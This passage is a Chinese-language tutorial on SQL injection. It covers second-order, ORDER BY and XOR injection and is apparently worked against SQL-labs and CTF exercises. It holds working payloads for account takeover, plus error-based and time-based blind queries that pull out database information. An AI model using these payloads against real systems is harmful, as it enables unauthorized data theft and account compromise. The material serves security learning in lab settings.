通过这道题的训练，便可以对堆叠注入有很深的印象了
# **0x03 二次注入**
### 涉及函数
`addslashes()` 函数返回在预定义字符之前添加反斜杠的字符串
`mysql_real_escape_string()` 函数转义 SQL 语句中使用的字符串中的特殊字符
`mysql_escape_string()` — 转义一个字符串
### 二次注入原理
看到涉及到的函数是不是感觉很熟悉，这是因为大多数网站都会对用户输入的语句进行对特殊符号的过滤，例如：恶意用户构造的插入语句为`1'`,经过这些函数的处理则变为`1\'`,这样便可以防止用户向服务器插入数据时引发的一些恶意操作，但这只是中途过滤了一下，最终返回到数据库里面的数据还是`1'`,如果管理者对取出的数据没有进行进一步的检验处理，服务器从数据库取出恶意数据，未经过滤就直接拼接SQL语句进行查询，就会发生了SQL二次注入。
**注意** ：二次注入不是注入两次的意思，二次注入相当于存储型的注入，可以看下面的图，介绍的也很直观。  
总结起来 二次注入其实是分为两个步骤：
  1. 插入恶意数据
  2. 引用恶意数据
原理既是如此，但不实战是无法掌握的，下面就来实战练习二次注入。
### **题目实战**
SQL-labs24关便涉及到二次注入
先来看一下登陆时的源码  
过滤函数将特殊符号给过滤掉了，所以直接注入是没戏的
再来查看一下用户注册的源码  
同样过滤特殊字符，从注册进行注入也是不可能了
最后看一下修改密码的源码  
同样如此，那就只能利用二次注入，先将恶意语句注入进数据库中，再调用
我们先注册一个用户`admin'#`,密码设置为`123`，注册好之后查看一下数据库
注册成功，这时其实我们就可以修改管理员`admin`，为什么那，来看下修改密码的sql语句
我们用户名为`admin'#`，调用该用户时，SQL语句则变为了  
我们将`admin`密码更改为123456,测试一下  
更改成功，这便是二次注入的简单利用
# 0x04 Order By注入
### **涉及函数**
if()函数  
updatexml()函数  
extractvalue()函数  
regexp()函数  
rand()函数
### 原理分析
当用户提供的数据通过MySQL的`“Order By”`语句中的值进行传递时，如果可控制的位置在order by子句后，如order参数可控：`select
* from xxxxx order by $_GET['order']`可能就会引发order by注入
利用大师傅的环境简单复现一下，源码分析：
`if(语句1、语句2、语句3)`如果语句1为真，则执行语句2，否则则执行语句3
    /?order=IF(1=1,name,price) 通过name字段排序
    /?order=IF(1=2,name,price) 通过price字段排序
简单介绍下SQL语句中`case` 的两种格式
    --简单Case函数
    case 列名
    when   条件值1   then  选项1
    when   条件值2   then  选项2
    else   默认值    end
    --Case搜索函数
    case  
    when  列名=条件值1   then  选项1
    when  列名=条件值2   then  选项2
    else  默认值 end
两种方式，可以实现相同的功能。简单`Case`函数的写法相对比较简洁，但是和`Case`搜索函数相比，功能方面会有些限制，比如写下面的判断式
    /?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序
    /?order=(CASE+WHEN+(1=2)+THEN+name+ELSE+price+END) 通过price字段排序
如果想利用构造的语句的话，直接将后面的选项更改成自己构造的语句即可  
`IFNULL()` 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL
则返回第一个参数的值，所以也可以通过IFNULL来排序，甚至构造恶意语句
    /?order=IFNULL(NULL,price) 通过price字段排序
    /?order=IFNULL(NULL,name) 通过name字段排序
**返回多条记录**
    /?order=IF(1=1,1,(select+1+union+select+2)) 正确
    /?order=IF(1=2,1,(select+1+union+select+2)) 错误
**利用报错**
    /?order=(select+1+regexp+if(1=1,1,0x00)) 正常
    /?order=(select+1+regexp+if(1=2,1,0x00)) 错误
    /?order=extractvalue(1,if(1=1,1,user())) 正确
    /?order=extractvalue(1,if(1=2,1,user())) 错误
利用if语句，也可以在参数order后构造时间盲注，同样也是这里虽然是简单的排序，但如果将语句更改为猜解数据库的语句也是可以的  
如：
    /?order=if(条件1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间
    /?order=if(条件1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒
利用order
by注入不可能直接爆出数据，只能通过猜解来获得数据，猜解数据时只能一位一位的猜，所以可以利用`substr`截取函数以及`left`、`right`函数将每个字符分割出来，进行猜解，如果遇到Order
by注入，最好用脚本，手注得累死
Order
by注入就是通过这些函数，开发者本意是希望方便用户进行排序观察等，但如果不对其做出任何限制，就会被恶意利用，利用函数的功能去执行一些SQL注入语句，从而泄露信息。
### **题目实战**
使用SQL-labs46关做测试  
利用sort可以进行信息查询，可以通过`asc` 和`desc`查看返回数据是否相同来简单判断是否存在order by注入,因为如果语句中不写`order
by`，默认是按照表结构中定义的“主键”`(Primary Key)` 进行升序`（ASC）`排列，如果通过`asc`
和`desc`查看返回数据相同则不存在order by注入，反之则存在。
上面原理介绍也说过，order by注入依靠那些函数，所以我们可以构造任意的语句
如： **报错语句**
    ?sort=1 and(updatexml(1,concat(0x7e,(select database())),0));
下面的更改报错语句中的payload就可爆出其他内容
**时间盲注**
    ?sort=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(10)))test))
我们将前面的判断条件更改即可来猜解数据，例如：
    ?sort=if(ascii(substr((select database()),1,1))>200,1,(SELECT(1)FROM(SELECT(SLEEP(10)))test))
这里我估计设置ascll大一点来测试是否可行，除此之外还可以利用rand函数
    ?sort=rand(ascii(substr((select database()),1,1))>127)
    ?sort=rand(ascii(substr((select database()),1,1))>1)
发现回显内容是不同的，那如何判断是对是错，如何写出脚本  
发现`ascll>127`时最后显示的`admin1`,而`ascll>1`时为`superman`  
经过多次测试  
`superman`_代表正确  
`admin1`_代表错误  
即可写出盲注脚本，来猜解数据库、表等信息
总结：这次就先总结到这里，SQL注入还有很多姿势，如异或注入等，
# **0x05 异或注入**
### **涉及符号**
MySQL中，异或用`^`或`xor`表示
### **原理分析**
异或注入原理较为简单一些，运算法则就是：两个条件相同（同真或同假）即为假`（0）`，两个条件不同即为真`（1）`，`null`与任何条件做异或运算都为`null`
简单在mysql命令行演示一下：  
用异或方法可以判断一些字符是否被过滤，如:  
CTF题中如果想判断那些函数被过滤，便可以通过异或查询
    符号^(str)^符号 -符号具体要结合题，str是由我们定义的命令
### 题目实战
当`id=5`时，显示出来这段提示，那就来SQL注入  
输入`id=1'`时报错  
当输入`id=1'%23`时不报错，输入`id=1' and
1=1%23`又报错，看来是过滤了`and或者空格`，经测试发现是过滤了`and`，那肯定还有被过滤的字符，可以使用异或查询来判断出那个字符被过滤掉
    ?id=1'^(length('union')!=0)^'
这里可能会有点绕，故意设置成长度不等于0，假如`length('union')!=0`成立（真），则说明`union`未被过滤，则页面将会回显错误（因为同真即为假），如果`length('union')!=0`不成立（假），说明`union`确实已经被过滤掉了，则页面回显正常  
页面回显正常，说明`length('union')==0`，故`union`被过滤掉了，同样的方法检测
    select,union,and,or
等字符被过滤掉
下面通过双写绕过即可得出表名等，这里重点在于介绍异或查询这种方法，所以下面就不深究了。
异或注入也是同样的原理，更改相应的`payload`即可
# **总结**
注入的方法真的很多，除此之外还有利用MySQL的SQL预处理进行注入等等，要学的内容还有很多，继续加油！